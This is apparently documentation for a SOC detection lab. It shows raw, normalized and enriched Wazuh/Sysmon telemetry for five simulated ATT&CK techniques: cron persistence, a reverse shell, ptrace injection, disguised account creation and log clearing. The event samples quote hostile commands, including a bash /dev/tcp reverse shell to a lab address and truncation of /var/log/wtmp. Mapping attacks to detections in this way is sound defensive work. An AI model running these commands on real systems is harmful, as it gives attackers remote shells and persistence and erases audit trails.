# Telemetry Visibility Levels

This document defines the three telemetry layers produced by each simulated ATT&CK technique,
following the SOC analyst model: **L0 (Raw)** → **L1 (Normalized)** → **L2 (Enriched)**.

---

## Visibility Model

| Level | Name | Consumer | Description |
|---|---|---|---|
| **L0** | Raw | Tier-3 / Threat Intel | Raw Sysmon XML/JSON as written to syslog — unmodified, maximum fidelity |
| **L1** | Normalized | Tier-1 / Tier-2 | Wazuh-decoded fields — structured, queryable, agent-tagged |
| **L2** | Enriched | Tier-1 SOC | MITRE ATT&CK-tagged alert with severity, tactic, and rule context |

---

## T1053.003 — Scheduled Task: Cron

### L0 — Raw Sysmon Event
```json
{
  "EventID": "1",
  "EventType": "ProcessCreate",
  "Hostname": "agent-node",
  "UtcTime": "2024-06-01 14:22:03.112",
  "Image": "/usr/bin/crontab",
  "CommandLine": "crontab -u vagrant -",
  "User": "root",
  "ParentImage": "/bin/bash",
  "ParentCommandLine": "bash /vagrant/attack/techniques/T1053_scheduled_task.sh"
}
```

### L1 — Wazuh Normalized Fields
```json
{
  "agent.name": "agent-node",
  "agent.ip": "192.168.56.20",
  "data.sysmon.eventid": "1",
  "data.sysmon.image": "/usr/bin/crontab",
  "data.sysmon.commandline": "crontab -u vagrant -",
  "data.sysmon.user": "root",
  "data.sysmon.parentimage": "/bin/bash",
  "timestamp": "2024-06-01T14:22:03.112Z"
}
```

### L2 — Wazuh Enriched Alert
```json
{
  "rule.id": "100001",
  "rule.level": 10,
  "rule.description": "ATT&CK T1053.003 - Crontab invoked (possible scheduled task persistence)",
  "rule.mitre.technique": ["T1053.003"],
  "rule.mitre.tactic": ["Persistence", "Privilege Escalation"],
  "rule.groups": ["sysmon", "mitre", "persistence"]
}
```

---

## T1059.004 — Unix Shell (Reverse Shell Pattern)

### L0 — Raw Sysmon Event
```json
{
  "EventID": "1",
  "Image": "/bin/bash",
  "CommandLine": "bash -i >& /dev/tcp/192.168.56.30/4444 0>&1",
  "User": "root",
  "ParentImage": "/bin/bash"
}
```

### L1 — Wazuh Normalized
```json
{
  "data.sysmon.eventid": "1",
  "data.sysmon.image": "/bin/bash",
  "data.sysmon.commandline": "bash -i >& /dev/tcp/192.168.56.30/4444 0>&1",
  "agent.name": "agent-node"
}
```

### L2 — Wazuh Enriched Alert
```json
{
  "rule.id": "100010",
  "rule.level": 15,
  "rule.description": "ATT&CK T1059.004 - Reverse shell pattern detected in command line",
  "rule.mitre.technique": ["T1059.004"],
  "rule.mitre.tactic": ["Execution", "Defense Evasion"]
}
```

---

## T1055 — Process Injection (ptrace / /proc/mem)

### L0 — Raw Sysmon Event
```json
{
  "EventID": "10",
  "EventType": "ProcessAccess",
  "SourceImage": "/usr/bin/python3",
  "TargetProcessId": "1847",
  "TargetImage": "/bin/bash",
  "CallTrace": "ptrace(PTRACE_ATTACH, 1847, ...)"
}
```

### L1 — Wazuh Normalized
```json
{
  "data.sysmon.eventid": "10",
  "data.sysmon.image": "/usr/bin/python3",
  "data.sysmon.targetprocessid": "1847",
  "data.sysmon.targetimage": "/bin/bash"
}
```

### L2 — Wazuh Enriched Alert
```json
{
  "rule.id": "100021",
  "rule.level": 12,
  "rule.description": "ATT&CK T1055 - Process memory write via /proc/PID/mem or ptrace",
  "rule.mitre.technique": ["T1055"],
  "rule.mitre.tactic": ["Defense Evasion", "Privilege Escalation"]
}
```

---

## T1136.001 — Create Local Account

### L0 — Raw Sysmon Event
```json
{
  "EventID": "1",
  "Image": "/usr/sbin/useradd",
  "CommandLine": "useradd --comment 'Service Account' --shell /bin/bash svc_backup_4521",
  "User": "root"
}
```

### L1 — Wazuh Normalized
```json
{
  "data.sysmon.eventid": "1",
  "data.sysmon.image": "/usr/sbin/useradd",
  "data.sysmon.commandline": "useradd --comment Service Account --shell /bin/bash svc_backup_4521",
  "data.sysmon.user": "root"
}
```

### L2 — Wazuh Enriched Alert
```json
{
  "rule.id": "100030",
  "rule.level": 10,
  "rule.description": "ATT&CK T1136.001 - Local account creation detected",
  "rule.mitre.technique": ["T1136.001"],
  "rule.mitre.tactic": ["Persistence"]
}
```

---

## T1070.003 — Clear Linux Logs

### L0 — Raw Sysmon Event
```json
{
  "EventID": "1",
  "Image": "/usr/bin/truncate",
  "CommandLine": "truncate -s 0 /var/log/wtmp",
  "User": "root",
  "ParentImage": "/bin/bash"
}
```

### L1 — Wazuh Normalized
```json
{
  "data.sysmon.eventid": "1",
  "data.sysmon.image": "/usr/bin/truncate",
  "data.sysmon.commandline": "truncate -s 0 /var/log/wtmp",
  "data.sysmon.user": "root"
}
```

### L2 — Wazuh Enriched Alert
```json
{
  "rule.id": "100041",
  "rule.level": 12,
  "rule.description": "ATT&CK T1070.003 - System log file tampered or cleared",
  "rule.mitre.technique": ["T1070.003"],
  "rule.mitre.tactic": ["Defense Evasion"]
}
```

---

## Telemetry Coverage Matrix

| Technique | Sysmon EventIDs | L0 Fidelity | L1 Fields | L2 MITRE Tag | Wazuh Rule |
|---|---|---|---|---|---|
| T1053.003 | 1, 11 | ✅ Full | image, cmdline, targetfile | ✅ | 100001, 100002 |
| T1059.004 | 1, 3 | ✅ Full | cmdline, destip, destport | ✅ | 100010, 100011 |
| T1055 | 8, 10 | ⚠️ Partial (Yama) | targetpid, targetimage | ✅ | 100020, 100021 |
| T1136.001 | 1, 11 | ✅ Full | image, cmdline, targetfile | ✅ | 100030, 100031 |
| T1070.003 | 1, 11 | ✅ Full | image, cmdline, targetfile | ✅ | 100040, 100041 |

> **Note on T1055:** Actual memory write is blocked by Linux Yama LSM (`kernel.yama.ptrace_scope=1`).
> The syscall attempt still generates ProcessAccess telemetry, which is the relevant forensic artifact.
